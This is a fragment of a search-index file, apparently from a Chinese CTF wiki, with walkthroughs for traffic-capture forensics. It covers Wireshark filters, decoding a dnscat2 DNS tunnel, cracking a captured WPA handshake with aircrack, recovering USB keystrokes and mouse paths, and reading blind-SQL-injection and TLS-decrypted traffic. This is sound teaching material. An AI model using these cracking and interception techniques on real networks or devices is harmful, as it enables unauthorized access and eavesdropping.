\u67e5\u8be2\u5305\u53ea\u6709\u5934\u90e8\u548c\u95ee\u9898\u4e24\u4e2a\u90e8\u5206\uff0cDNS\u6536\u5230\u67e5\u8be2\u5305\u540e\uff0c\u6839\u636e\u67e5\u8be2\u5230\u7684\u4fe1\u606f\u8ffd\u52a0\u56de\u7b54\u4fe1\u606f\u3001\u6388\u6743\u673a\u6784\u3001\u989d\u5916\u8d44\u6e90\u8bb0\u5f55\uff0c\u5e76\u4e14\u4fee\u6539\u4e86\u5305\u5934\u7684\u76f8\u5173\u6807\u8bc6\u518d\u8fd4\u56de\u7ed9\u5ba2\u6237\u7aef\u3002 \u6bcf\u4e2aquestion\u90e8\u5206 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+ | | / QNAME / / / +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+ | QTYPE | +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+ | QCLASS | +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+ ``` - QNAME\uff1a\u4e3a\u67e5\u8be2\u7684\u57df\u540d\uff0c\u662f\u53ef\u53d8\u957f\u7684\uff0c\u7f16\u7801\u683c\u5f0f\u4e3a\uff1a\u5c06\u57df\u540d\u7528.\u53f7\u5212\u5206\u4e3a\u591a\u4e2a\u90e8\u5206\uff0c\u6bcf\u4e2a\u90e8\u5206\u524d\u9762\u52a0\u4e0a\u4e00\u4e2a\u5b57\u8282\u8868\u793a\u8be5\u90e8\u5206\u7684\u957f\u5ea6\uff0c\u6700\u540e\u52a0\u4e00\u4e2a0\u5b57\u8282\u8868\u793a\u7ed3\u675f - QTYPE\uff1a\u536016\u4f4d\uff0c\u8868\u793a\u67e5\u8be2\u7c7b\u578b\uff0c\u5171\u670916\u79cd\uff0c\u5e38\u7528\u503c\u6709\uff1a1\uff08A\u8bb0\u5f55\uff0c\u8bf7\u6c42\u4e3b\u673aIP\u5730\u5740\uff09\u30012\uff08NS\uff0c\u8bf7\u6c42\u6388\u6743DNS\u670d\u52a1\u5668\uff09\u30015\uff08CNAME\u522b\u540d\u67e5\u8be2\uff09 **\u4f8b\u9898** - [BSides San Francisco CTF 2017 : dnscap-500](https://github.com/ctfs/write-ups-2017/tree/master/bsidessf-ctf-2017/forensics/dnscap-500) - Step: - wireshark \u6253\u5f00\u53d1\u73b0\u5168\u90e8\u4e3aDNS\u534f\u8bae,\u67e5\u8be2\u540d\u4e3a\u5927\u91cf\u5b57\u7b26\u4e32`([\\w\\.]+)\\.skullseclabs\\.org` - `tshark -r dnscap.pcap -T fields -e dns.qry.name > hex`\u63d0\u53d6\u540e\uff0cpython\u8f6c\u7801 ```python import re find = \"\" with open('hex','rb') as f: for i in f: text = re.findall(r'([\\w\\.]+)\\.skull',i) if text: find += text[0].replace('.','') print find \u53d1\u73b0\u51e0\u6761\u5173\u952e\u4fe1\u606f Welcome to dnscap! The flag is below, have fun!! Welcome to dnscap! The flag is below, have fun!! !command (sirvimes) ... IHDR gAMA bKGD pHYs IHDR gAMA bKGD pHYs tIME IDATx ... 2017-02-01T21:04:00-08:00 IEND console (sirvimes) console (sirvimes) Good luck! That was dnscat2 traffic on a flaky connection with lots of re-transmits. Seriously, Good luck! That was dnscat2 traffic on a flaky connection with lots of re-transmits. Seriously, d[ good luck. :)+ flag\u786e\u5b9e\u5305\u542b\u5728\u5176\u4e2d,\u4f46\u662f\u6709\u5927\u91cf\u91cd\u590d\u4fe1\u606f,\u4e00\u662f\u5e94\u4e3a question \u5728dns\u534f\u8bae\u4e2d\u67e5\u8be2\u548c\u53cd\u9988\u65f6\u90fd\u4f1a\u7528\u5230, -Y \"ip.src == 192.168.43.91\" \u8fdb\u884c\u8fc7\u6ee4\u540e\u53d1\u73b0\u8fd8\u662f\u6709\u4e0d\u5c11\u91cd\u590d\u90e8\u5206 %2A} %2A} %2A}q %2A}x %2A} IHDR gAMA bKGD pHYs tIME IDATx HBBH CxRH! C1%t ceyF i4ZI32 rP@1 ceyF i4ZI32 rP@1 ceyF i4ZI32 rP@1 ceyF i4ZI32 rP@1 \u6839\u636e\u53d1\u73b0\u7684 dnscat \u627e\u5230 https://github.com/iagox86/dnscat2/blob/master/doc/protocol.md \u8fd9\u91cc\u4ecb\u7ecd\u4e86 dnscat \u534f\u8bae\u7684\u76f8\u5173\u4fe1\u606f,\u8fd9\u662f\u4e00\u79cd\u901a\u8fc7DNS\u4f20\u9012\u6570\u636e\u7684\u53d8\u79cd\u534f\u8bae,\u9898\u76ee\u6587\u4ef6\u4e2d\u5e94\u8be5\u672a\u4f7f\u7528\u52a0\u5bc6,\u6240\u4ee5\u76f4\u63a5\u770b\u8fd9\u91cc\u7684\u6570\u636e\u5757\u4fe1\u606f MESSAGE_TYPE_MSG: [0x01] (uint16_t) packet_id (uint8_t) message_type [0x01] (uint16_t) session_id (uint16_t) seq (uint16_t) ack (byte[]) data \u5728 qry.name \u4e2d\u53bb\u9664\u5176\u4f59\u5b57\u6bb5,\u53ea\u7559\u4e0b data \u5feb,\u4ece\u800c\u5408\u5e76\u6570\u636e,\u518d\u4ece16\u8fdb\u5236\u4e2d\u68c0\u7d22 89504e.....6082 \u63d0\u53d6 png ,\u5f97\u5230flag import re find = [] with open ( 'hex' , 'rb' ) as f : for i in f : text = re . findall ( r '([\\w\\.]+)\\.skull' , i ) if text : tmp = text [ 0 ] . replace ( '.' , '' ) find . append ( tmp [ 18 :]) last = [] for i in find : if i not in last : last . append ( i ) print '' . join ( last ) flag \u76f8\u5173\u9898\u76ee IceCTF-2016:Search EIS-2017:DNS 101 \u53c2\u8003 https://github.com/lisijie/homepage/blob/master/posts/tech/dns%E5%8D%8F%E8%AE%AE%E8%A7%A3%E6%9E%90.md https://xpnsec.tumblr.com/post/157479786806/bsidessf-ctf-dnscap-walkthrough WIFI \u00b6 802.11\u662f\u73b0\u4eca\u65e0\u7ebf\u5c40\u57df\u7f51\u901a\u7528\u7684\u6807\u51c6,\u5e38\u89c1\u8ba4\u8bc1\u65b9\u5f0f - \u4e0d\u542f\u7528\u5b89\u5168\u200d\u200d - WEP\u200d\u200d - WPA/WPA2-PSK\uff08\u9884\u5171\u4eab\u5bc6\u94a5\uff09\u200d\u200d - PA/WPA2 802.1X \uff08radius\u8ba4\u8bc1\uff09 WPA-PSK \u00b6 \u8ba4\u8bc1\u5927\u81f4\u8fc7\u7a0b\u5982\u4e0b\u56fe \u5176\u4e2d\u56db\u6b21\u63e1\u624b\u8fc7\u7a0b 4\u6b21\u63e1\u624b\u5f00\u59cb\u4e8e\u9a8c\u8bc1\u5668(AP)\uff0c\u5b83\u4ea7\u751f\u4e00\u4e2a\u968f\u673a\u7684\u503c(ANonce)\u53d1\u9001\u7ed9\u8bf7\u6c42\u8005 \u8bf7\u6c42\u8005\u4e5f\u4ea7\u751f\u4e86\u5b83\u81ea\u5df1\u7684\u968f\u673aSNonce\uff0c\u7136\u540e\u7528\u8fd9\u4e24\u4e2aNonces\u4ee5\u53caPMK\u751f\u6210\u4e86PTK\u3002\u8bf7\u6c42\u8005\u56de\u590d\u6d88\u606f2\u7ed9\u9a8c\u8bc1\u5668,\u8fd8\u6709\u4e00\u4e2aMIC\uff08message integrity code\uff0c\u6d88\u606f\u9a8c\u8bc1\u7801\uff09\u4f5c\u4e3aPMK\u7684\u9a8c\u8bc1 \u5b83\u5148\u8981\u9a8c\u8bc1\u8bf7\u6c42\u8005\u5728\u6d88\u606f2\u4e2d\u53d1\u6765\u7684MIC\u7b49\u4fe1\u606f\uff0c\u9a8c\u8bc1\u6210\u529f\u540e\uff0c\u5982\u679c\u9700\u8981\u5c31\u751f\u6210GTK\u3002\u7136\u540e\u53d1\u9001\u6d88\u606f3 \u8bf7\u6c42\u8005\u6536\u5230\u6d88\u606f3\uff0c\u9a8c\u8bc1MIC\uff0c\u5b89\u88c5\u5bc6\u94a5\uff0c\u53d1\u9001\u6d88\u606f4\uff0c\u4e00\u4e2a\u786e\u8ba4\u4fe1\u606f\u3002\u9a8c\u8bc1\u5668\u6536\u5230\u6d88\u606f4\uff0c\u9a8c\u8bc1MIC\uff0c\u5b89\u88c5\u76f8\u540c\u7684\u5bc6\u94a5 \u4f8b\u9898 \u5b9e\u9a8c\u5427: http://ctf5.shiyanbar.com/misc/shipin.cap \u4ece\u5927\u91cf\u7684 Deauth \u653b\u51fb\u57fa\u672c\u53ef\u4ee5\u5224\u65ad\u662f\u4e00\u4e2a\u7834\u89e3wifi\u65f6\u7684\u6d41\u91cf\u653b\u51fb \u540c\u65f6\u4e5f\u6210\u529f\u53d1\u73b0\u4e86\u63e1\u624b\u5305\u4fe1\u606f \u63a5\u4e0b\u6765\u8dd1\u5bc6\u7801 linux: aircrack\u5957\u4ef6 windows: wifipr,\u901f\u5ea6\u6bd4esaw\u5feb,GTX850\u80fd\u5c06\u8fd110w\\s :) \u5f97\u5230\u5bc6\u7801 88888888 \u5728wireshark\u4e2d Edit -> Preferences -> Protocols -> IEEE802.11 -> Edit \u4ee5 key:SSID \u5f62\u5f0f\u586b\u5165\u5373\u53ef\u89e3\u5bc6wifi\u5305\u770b\u5230\u660e\u6587\u6d41\u91cf KCARCK\u76f8\u5173: https://www.krackattacks.com/ \u53c2\u8003 http://www.freebuf.com/articles/wireless/58342.html http://blog.csdn.net/keekjkj/article/details/46753883 USB \u00b6 USB\u8be6\u8ff0 : http://www.usb.org/developers/hidpage/Hut1_12v2.pdf \u9f20\u6807\u534f\u8bae \u9f20\u6807\u79fb\u52a8\u65f6\u8868\u73b0\u4e3a\u8fde\u7eed\u6027\uff0c\u4e0e\u952e\u76d8\u51fb\u952e\u7684\u79bb\u6563\u6027\u4e0d\u4e00\u6837\uff0c\u4e0d\u8fc7\u5b9e\u9645\u4e0a\u9f20\u6807\u52a8\u4f5c\u6240\u4ea7\u751f\u7684\u6570\u636e\u5305\u4e5f\u662f\u79bb\u6563\u7684\uff0c\u6bd5\u7adf\u8ba1\u7b97\u673a\u8868\u73b0\u7684\u8fde\u7eed\u6027\u4fe1\u606f\u90fd\u662f\u7531\u5927\u91cf\u79bb\u6563\u4fe1\u606f\u6784\u6210\u7684 \u6bcf\u4e00\u4e2a\u6570\u636e\u5305\u7684\u6570\u636e\u533a\u6709\u56db\u4e2a\u5b57\u8282\uff0c\u7b2c\u4e00\u4e2a\u5b57\u8282\u4ee3\u8868\u6309\u952e\uff0c\u5f53\u53d60x00\u65f6\uff0c\u4ee3\u8868\u6ca1\u6709\u6309\u952e\u3001\u4e3a0x01\u65f6\uff0c\u4ee3\u8868\u6309\u5de6\u952e\uff0c\u4e3a0x02\u65f6\uff0c\u4ee3\u8868\u5f53\u524d\u6309\u952e\u4e3a\u53f3\u952e\u3002\u7b2c\u4e8c\u4e2a\u5b57\u8282\u53ef\u4ee5\u770b\u6210\u662f\u4e00\u4e2asigned byte\u7c7b\u578b\uff0c\u5176\u6700\u9ad8\u4f4d\u4e3a\u7b26\u53f7\u4f4d\uff0c\u5f53\u8fd9\u4e2a\u503c\u4e3a\u6b63\u65f6\uff0c\u4ee3\u8868\u9f20\u6807\u6c34\u5e73\u53f3\u79fb\u591a\u5c11\u50cf\u7d20\uff0c\u4e3a\u8d1f\u65f6\uff0c\u4ee3\u8868\u6c34\u5e73\u5de6\u79fb\u591a\u5c11\u50cf\u7d20\u3002\u7b2c\u4e09\u4e2a\u5b57\u8282\u4e0e\u7b2c\u4e8c\u5b57\u8282\u7c7b\u4f3c\uff0c\u4ee3\u8868\u5782\u76f4\u4e0a\u4e0b\u79fb\u52a8\u7684\u504f\u79fb\u3002 \u5f97\u5230\u8fd9\u4e9b\u70b9\u7684\u4fe1\u606f\u540e,\u5373\u53ef\u6062\u590d\u51fa\u9f20\u6807\u79fb\u52a8\u8f68\u8ff9 Tools UsbMiceDataHacker \u952e\u76d8\u534f\u8bae \u952e\u76d8\u6570\u636e\u5305\u7684\u6570\u636e\u957f\u5ea6\u4e3a8\u4e2a\u5b57\u8282\uff0c\u51fb\u952e\u4fe1\u606f\u96c6\u4e2d\u5728\u7b2c3\u4e2a\u5b57\u8282 \u6839\u636edata\u503c\u4e0e\u5177\u4f53\u952e\u4f4d\u7684\u5bf9\u5e94\u5173\u7cfb \u53ef\u4ece\u6570\u636e\u5305\u6062\u590d\u51fa\u952e\u76d8\u7684\u6848\u4ef6\u4fe1\u606f Tools UsbKeyboardDataHacker \u53c2\u8003 - https://www.anquanke.com/post/id/85218","title":"\u534f\u8bae\u5206\u6790"},{"location":"misc/traffic/protocols/#wireshark","text":"","title":"Wireshark \u5e38\u7528\u529f\u80fd\u4ecb\u7ecd"},{"location":"misc/traffic/protocols/#_1","text":"\u663e\u793a\u8fc7\u6ee4\u5668\u53ef\u4ee5\u7528\u5f88\u591a\u4e0d\u540c\u7684\u53c2\u6570\u6765\u4f5c\u4e3a\u5339\u914d\u6807\u51c6\uff0c\u6bd4\u5982IP\u5730\u5740\u3001\u534f\u8bae\u3001\u7aef\u53e3\u53f7\u3001\u67d0\u4e9b\u534f\u8bae\u5934\u90e8\u7684\u53c2\u6570\u3002\u6b64\u5916\uff0c\u7528\u6237\u4e5f\u7528\u4e00\u4e9b\u6761\u4ef6\u5de5\u5177\u548c\u4e32\u8054\u8fd0\u7b97\u7b26\u521b\u5efa\u51fa\u66f4\u52a0\u590d\u6742\u7684\u8868\u8fbe\u5f0f\u3002\u7528\u6237\u53ef\u4ee5\u5c06\u4e0d\u540c\u7684\u8868\u8fbe\u5f0f\u7ec4\u5408\u8d77\u6765\uff0c\u8ba9\u8f6f\u4ef6\u663e\u793a\u7684\u6570\u636e\u5305\u8303\u56f4\u66f4\u52a0\u7cbe\u786e\u3002\u5728\u6570\u636e\u5305\u5217\u8868\u9762\u677f\u4e2d\u663e\u793a\u7684\u6240\u6709\u6570\u636e\u5305\u90fd\u53ef\u4ee5\u7528\u6570\u636e\u5305\u4e2d\u5305\u542b\u7684\u5b57\u6bb5\u8fdb\u884c\u8fc7\u6ee4\u3002 [not] Expression [and|or] [not] Expression \u7ecf\u5e38\u8981\u7528\u5230\u5404\u79cd\u8fd0\u7b97\u7b26 \u8fd0\u7b97\u7b26 \u8bf4\u660e == \u7b49\u4e8e != \u4e0d\u7b49\u4e8e > \u5927\u4e8e < \u5c0f\u4e8e >= \u5927\u4e8e\u7b49\u4e8e <= \u5c0f\u4e8e\u7b49\u4e8e \u4e0e and , && \u6216 or , || \u975e ! , not","title":"\u663e\u793a\u8fc7\u6ee4\u5668"},{"location":"misc/traffic/protocols/#_2","text":"\u501f\u52a9\u4e8e\u8fc7\u6ee4\u5668\u7a97\u53e3 \u501f\u52a9\u4e8e\u5de5\u5177\u6761\u7684\u8f93\u5165\u680f \u5c06\u6570\u636e\u5305\u67d0\u4e2a\u5c5e\u6027\u503c\u6307\u5b9a\u4e3a\u8fc7\u6ee4\u6761\u4ef6 Note \u590d\u6742\u7684\u8fc7\u6ee4\u547d\u4ee4\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7\u7b2c\u4e09\u79cd\u65b9\u5f0f\u5f97\u5230\u8fc7\u6ee4\u8bed\u6cd5","title":"\u914d\u7f6e\u65b9\u6cd5"},{"location":"misc/traffic/protocols/#_3","text":"","title":"\u4fe1\u606f\u7edf\u8ba1"},{"location":"misc/traffic/protocols/#protocol-history","text":"\u8fd9\u4e2a\u7a97\u53e3\u73b0\u5b9e\u7684\u662f\u6355\u6349\u6587\u4ef6\u5305\u542b\u7684\u6240\u6709\u534f\u8bae\u7684\u6811\u72b6\u5206\u652f \u5305\u542b\u7684\u5b57\u6bb5 \u540d\u79f0 \u542b\u4e49 Protocol\uff1a \u534f\u8bae\u540d\u79f0 % Packets\uff1a \u542b\u6709\u8be5\u534f\u8bae\u7684\u5305\u6570\u76ee\u5728\u6355\u6349\u6587\u4ef6\u6240\u6709\u5305\u6240\u5360\u7684\u6bd4\u4f8b Packets\uff1a \u542b\u6709\u8be5\u534f\u8bae\u7684\u5305\u7684\u6570\u76ee Bytes\uff1a \u542b\u6709\u8be5\u534f\u8bae\u7684\u5b57\u8282\u6570 Mbit/s\uff1a \u6293\u5305\u65f6\u95f4\u5185\u7684\u534f\u8bae\u5e26\u5bbd End Packets\uff1a \u8be5\u534f\u8bae\u4e2d\u7684\u5305\u7684\u6570\u76ee\uff08\u4f5c\u4e3a\u6587\u4ef6\u4e2d\u7684\u6700\u9ad8\u534f\u8bae\u5c42\uff09 End Bytes\uff1a \u8be5\u534f\u8bae\u4e2d\u7684\u5b57\u8282\u6570\uff08\u4f5c\u4e3a\u6587\u4ef6\u4e2d\u7684\u6700\u9ad8\u534f\u8bae\u5c42\uff09 End Mbit/s\uff1a \u6293\u5305\u65f6\u95f4\u5185\u7684\u534f\u8bae\u5e26\u5bbd\uff08\u4f5c\u4e3a\u6587\u4ef6\u4e2d\u7684\u6700\u9ad8\u534f\u8bae\u5c42\uff09 \u8fd9\u4e00\u529f\u80fd\u53ef\u4ee5\u4e3a\u5206\u6790\u6570\u636e\u5305\u7684\u4e3b\u8981\u65b9\u5411\u63d0\u4f9b\u4f9d\u636e","title":"Protocol History(\u534f\u8bae\u5206\u7ea7)"},{"location":"misc/traffic/protocols/#conversation","text":"\u53d1\u751f\u4e8e\u4e00\u7279\u5b9a\u7aef\u70b9\u7684IP\u95f4\u7684\u6240\u6709\u6d41\u91cf. Note \u67e5\u770b\u6536\u53d1\u5927\u91cf\u6570\u636e\u6d41\u7684IP\u5730\u5740\u3002\u5982\u679c\u662f\u4f60\u77e5\u9053\u7684\u670d\u52a1\u5668\uff08\u4f60\u8bb0\u5f97\u670d\u52a1\u5668\u7684\u5730\u5740\u6216\u5730\u5740\u8303\u56f4\uff09\uff0c\u90a3\u95ee\u9898\u5c31\u89e3\u51b3\u4e86\uff1b\u4f46\u4e5f\u6709\u53ef\u80fd\u53ea\u662f\u67d0\u53f0\u8bbe\u5907\u6b63\u5728\u626b\u63cf\u7f51\u7edc\uff0c\u6216\u4ec5\u662f\u4e00\u53f0\u4ea7\u751f\u8fc7\u591a\u6570\u636e\u7684PC\u3002 \u67e5\u770b\u626b\u63cf\u6a21\u5f0f\uff08scan pattern\uff09\u3002\u8fd9\u53ef\u80fd\u662f\u4e00\u6b21\u6b63\u5e38\u7684\u626b\u63cf\uff0c\u5982SNMP\u8f6f\u4ef6\u53d1\u9001ping\u62a5\u6587\u4ee5\u67e5\u627e\u7f51\u7edc\uff0c\u4f46\u901a\u5e38\u626b\u63cf\u90fd\u4e0d\u662f\u597d\u4e8b\u60c5","title":"Conversation(\u5bf9\u8bdd)"},{"location":"misc/traffic/protocols/#endpoints","text":"\u8fd9\u4e00\u5de5\u5177\u5217\u51fa\u4e86Wireshark\u53d1\u73b0\u7684\u6240\u6709endpoints\u4e0a\u7684\u7edf\u8ba1\u4fe1\u606f","title":"EndPoints(\u7aef\u70b9)"},{"location":"misc/traffic/protocols/#http","text":"Packet Counter \u53c2\u8003 http://blog.jobbole.com/73482/ http://www.vuln.cn/2103","title":"HTTP"},{"location":"misc/traffic/protocols/#_4","text":"\u6839\u636e\u603b\u4f53\u4fe1\u606f\u8fc5\u901f\u628a\u63e1\u6d41\u91cf\u5305\u603b\u4f53\u7279\u5f81,\u641e\u6e05\u695a \u505a\u4ec0\u4e48? TODO","title":"\u4fe1\u606f\u7edf\u8ba1 \u8fdb\u9636\u7248"},{"location":"misc/traffic/protocols/#_5","text":"","title":"\u5e38\u89c1\u534f\u8bae"},{"location":"misc/traffic/protocols/#httphttps","text":"\u4e3b\u8981\u96c6\u4e2d\u5728\u6d41\u91cf\u4e2d\u9644\u4ef6\u6216\u662f\u603b\u4f53\u5206\u6790\u4e0a,\u641e\u660e\u767d\u6d41\u91cf\u5728\u505a\u4ec0\u4e48\u4e4b\u540e,\u57fa\u672c\u53ef\u4ee5\u5b9a\u4f4d\u5230\u5bfb\u627eflag\u7684\u4f4d\u7f6e","title":"HTTP/HTTPs"},{"location":"misc/traffic/protocols/#http_1","text":"\u4f8b\u9898 \u6c5f\u82cf\u7701\u9886\u822a\u676f-2017:hack \u603b\u4f53\u89c2\u5bdf\u53ef\u4ee5\u5f97\u51fa: HTTP \u4e3a\u4e3b 102.168.173.134 \u4e3a\u4e3b \u4e0d\u5b58\u5728\u9644\u4ef6 \u4ece\u8fd9\u5f20\u56fe,\u57fa\u672c\u53ef\u4ee5\u5224\u65ad\u521d\u8fd9\u662f\u4e00\u4e2a\u5728 sql\u6ce8\u5165-\u76f2\u6ce8\u65f6\u4ea7\u751f\u7684\u6d41\u91cf\u5305 \u5230\u6b64\u4e3a\u6b62,\u57fa\u672c\u53ef\u4ee5\u5224\u65adflag\u7684\u65b9\u5411,\u63d0\u53d6\u51fa\u6240\u6709\u7684url\u540e,\u7528 python \u8f85\u52a9\u5373\u53ef\u5f97\u5230flag \u63d0\u53d6url: tshark -r hack.pcap -T fields -e http.request.full_uri|tr -s '\\n'|grep flag > log \u5f97\u5230\u76f2\u6ce8\u7ed3\u679c import re with open ( 'log' ) as f : tmp = f . read () flag = '' data = re . findall ( r '=(\\d*)%23' , tmp ) data = [ int ( i ) for i in data ] for i , num in enumerate ( data ): try : if num > data [ i + 1 ]: flag += chr ( num ) except Exception : pass print flag","title":"HTTP"},{"location":"misc/traffic/protocols/#https","text":"HTTPs = HTTP + SSL / TLS .\u670d\u52a1\u7aef\u548c\u5ba2\u6237\u7aef\u7684\u4fe1\u606f\u4f20\u8f93\u90fd\u4f1a\u901a\u8fc7TLS\u8fdb\u884c\u52a0\u5bc6\uff0c\u6240\u4ee5\u4f20\u8f93\u7684\u6570\u636e\u90fd\u662f\u52a0\u5bc6\u540e\u7684\u6570\u636e wireshark\u5206\u6790HTTPs \u4f8b\u9898 : - hack-dat-kiwi-ctf-2015:ssl-sniff-2 \u6253\u5f00\u6d41\u91cf\u5305\u53d1\u73b0\u662fSSL\u52a0\u5bc6\u8fc7\u7684\u6570\u636e,\u5bfc\u5165\u9898\u76ee\u63d0\u4f9b\u7684 server.key.insecure ,\u5373\u53ef\u89e3\u5bc6 GET /key.html HTTP/1.1 Host: localhost HTTP/1.1 200 OK Date: Fri, 20 Nov 2015 14:16:24 GMT Server: Apache/2.4.7 (Ubuntu) Last-Modified: Fri, 20 Nov 2015 14:15:54 GMT ETag: \"1c-524f98378d4e1\" Accept-Ranges: bytes Content-Length: 28 Content-Type: text/html The key is 39u7v25n1jxkl123","title":"HTTPS"},{"location":"misc/traffic/protocols/#ftp","text":"","title":"FTP"},{"location":"misc/traffic/protocols/#dns","text":"DNS\u901a\u5e38\u4e3aUDP\u534f\u8bae,\u62a5\u6587\u683c\u5f0f +-------------------------------+ | \u62a5\u6587\u5934 | +-------------------------------+ | \u95ee\u9898 ( \u5411\u670d\u52a1\u5668\u63d0\u51fa\u7684\u67e5\u8be2\u90e8\u5206 ) | +-------------------------------+ | \u56de\u7b54 ( \u670d\u52a1\u5668\u56de\u590d\u7684\u8d44\u6e90\u8bb0\u5f55 ) | +-------------------------------+ | \u6388\u6743 ( \u6743\u5a01\u7684\u8d44\u6e90\u8bb0\u5f55 ) | +-------------------------------+ | \u683c\u5916\u7684 ( \u683c\u5916\u7684\u8d44\u6e90\u8bb0\u5f55 ) | +-------------------------------+ \u67e5\u8be2\u5305\u53ea\u6709\u5934\u90e8\u548c\u95ee\u9898\u4e24\u4e2a\u90e8\u5206\uff0cDNS\u6536\u5230\u67e5\u8be2\u5305\u540e\uff0c\u6839\u636e\u67e5\u8be2\u5230\u7684\u4fe1\u606f\u8ffd\u52a0\u56de\u7b54\u4fe1\u606f\u3001\u6388\u6743\u673a\u6784\u3001\u989d\u5916\u8d44\u6e90\u8bb0\u5f55\uff0c\u5e76\u4e14\u4fee\u6539\u4e86\u5305\u5934\u7684\u76f8\u5173\u6807\u8bc6\u518d\u8fd4\u56de\u7ed9\u5ba2\u6237\u7aef\u3002 \u6bcf\u4e2aquestion\u90e8\u5206 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+ | | / QNAME / / / +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+ | QTYPE | +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+ | QCLASS | +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+ ``` - QNAME\uff1a\u4e3a\u67e5\u8be2\u7684\u57df\u540d\uff0c\u662f\u53ef\u53d8\u957f\u7684\uff0c\u7f16\u7801\u683c\u5f0f\u4e3a\uff1a\u5c06\u57df\u540d\u7528.\u53f7\u5212\u5206\u4e3a\u591a\u4e2a\u90e8\u5206\uff0c\u6bcf\u4e2a\u90e8\u5206\u524d\u9762\u52a0\u4e0a\u4e00\u4e2a\u5b57\u8282\u8868\u793a\u8be5\u90e8\u5206\u7684\u957f\u5ea6\uff0c\u6700\u540e\u52a0\u4e00\u4e2a0\u5b57\u8282\u8868\u793a\u7ed3\u675f - QTYPE\uff1a\u536016\u4f4d\uff0c\u8868\u793a\u67e5\u8be2\u7c7b\u578b\uff0c\u5171\u670916\u79cd\uff0c\u5e38\u7528\u503c\u6709\uff1a1\uff08A\u8bb0\u5f55\uff0c\u8bf7\u6c42\u4e3b\u673aIP\u5730\u5740\uff09\u30012\uff08NS\uff0c\u8bf7\u6c42\u6388\u6743DNS\u670d\u52a1\u5668\uff09\u30015\uff08CNAME\u522b\u540d\u67e5\u8be2\uff09 **\u4f8b\u9898** - [BSides San Francisco CTF 2017 : dnscap-500](https://github.com/ctfs/write-ups-2017/tree/master/bsidessf-ctf-2017/forensics/dnscap-500) - Step: - wireshark \u6253\u5f00\u53d1\u73b0\u5168\u90e8\u4e3aDNS\u534f\u8bae,\u67e5\u8be2\u540d\u4e3a\u5927\u91cf\u5b57\u7b26\u4e32`([\\w\\.]+)\\.skullseclabs\\.org` - `tshark -r dnscap.pcap -T fields -e dns.qry.name > hex`\u63d0\u53d6\u540e\uff0cpython\u8f6c\u7801 ```python import re find = \"\" with open('hex','rb') as f: for i in f: text = re.findall(r'([\\w\\.]+)\\.skull',i) if text: find += text[0].replace('.','') print find \u53d1\u73b0\u51e0\u6761\u5173\u952e\u4fe1\u606f Welcome to dnscap! The flag is below, have fun!! Welcome to dnscap! The flag is below, have fun!! !command (sirvimes) ... IHDR gAMA bKGD pHYs IHDR gAMA bKGD pHYs tIME IDATx ... 2017-02-01T21:04:00-08:00 IEND console (sirvimes) console (sirvimes) Good luck! That was dnscat2 traffic on a flaky connection with lots of re-transmits. Seriously, Good luck! That was dnscat2 traffic on a flaky connection with lots of re-transmits. Seriously, d[ good luck. :)+ flag\u786e\u5b9e\u5305\u542b\u5728\u5176\u4e2d,\u4f46\u662f\u6709\u5927\u91cf\u91cd\u590d\u4fe1\u606f,\u4e00\u662f\u5e94\u4e3a question \u5728dns\u534f\u8bae\u4e2d\u67e5\u8be2\u548c\u53cd\u9988\u65f6\u90fd\u4f1a\u7528\u5230, -Y \"ip.src == 192.168.43.91\" \u8fdb\u884c\u8fc7\u6ee4\u540e\u53d1\u73b0\u8fd8\u662f\u6709\u4e0d\u5c11\u91cd\u590d\u90e8\u5206 %2A} %2A} %2A}q %2A}x %2A} IHDR gAMA bKGD pHYs tIME IDATx HBBH CxRH! C1%t ceyF i4ZI32 rP@1 ceyF i4ZI32 rP@1 ceyF i4ZI32 rP@1 ceyF i4ZI32 rP@1 \u6839\u636e\u53d1\u73b0\u7684 dnscat \u627e\u5230 https://github.com/iagox86/dnscat2/blob/master/doc/protocol.md \u8fd9\u91cc\u4ecb\u7ecd\u4e86 dnscat \u534f\u8bae\u7684\u76f8\u5173\u4fe1\u606f,\u8fd9\u662f\u4e00\u79cd\u901a\u8fc7DNS\u4f20\u9012\u6570\u636e\u7684\u53d8\u79cd\u534f\u8bae,\u9898\u76ee\u6587\u4ef6\u4e2d\u5e94\u8be5\u672a\u4f7f\u7528\u52a0\u5bc6,\u6240\u4ee5\u76f4\u63a5\u770b\u8fd9\u91cc\u7684\u6570\u636e\u5757\u4fe1\u606f MESSAGE_TYPE_MSG: [0x01] (uint16_t) packet_id (uint8_t) message_type [0x01] (uint16_t) session_id (uint16_t) seq (uint16_t) ack (byte[]) data \u5728 qry.name \u4e2d\u53bb\u9664\u5176\u4f59\u5b57\u6bb5,\u53ea\u7559\u4e0b data \u5feb,\u4ece\u800c\u5408\u5e76\u6570\u636e,\u518d\u4ece16\u8fdb\u5236\u4e2d\u68c0\u7d22 89504e.....6082 \u63d0\u53d6 png ,\u5f97\u5230flag import re find = [] with open ( 'hex' , 'rb' ) as f : for i in f : text = re . findall ( r '([\\w\\.]+)\\.skull' , i ) if text : tmp = text [ 0 ] . replace ( '.' , '' ) find . append ( tmp [ 18 :]) last = [] for i in find : if i not in last : last . append ( i ) print '' . join ( last ) flag \u76f8\u5173\u9898\u76ee IceCTF-2016:Search EIS-2017:DNS 101 \u53c2\u8003 https://github.com/lisijie/homepage/blob/master/posts/tech/dns%E5%8D%8F%E8%AE%AE%E8%A7%A3%E6%9E%90.md https://xpnsec.tumblr.com/post/157479786806/bsidessf-ctf-dnscap-walkthrough","title":"DNS"},{"location":"misc/traffic/protocols/#wifi","text":"802.11\u662f\u73b0\u4eca\u65e0\u7ebf\u5c40\u57df\u7f51\u901a\u7528\u7684\u6807\u51c6,\u5e38\u89c1\u8ba4\u8bc1\u65b9\u5f0f - \u4e0d\u542f\u7528\u5b89\u5168\u200d\u200d - WEP\u200d\u200d - WPA/WPA2-PSK\uff08\u9884\u5171\u4eab\u5bc6\u94a5\uff09\u200d\u200d - PA/WPA2 802.1X 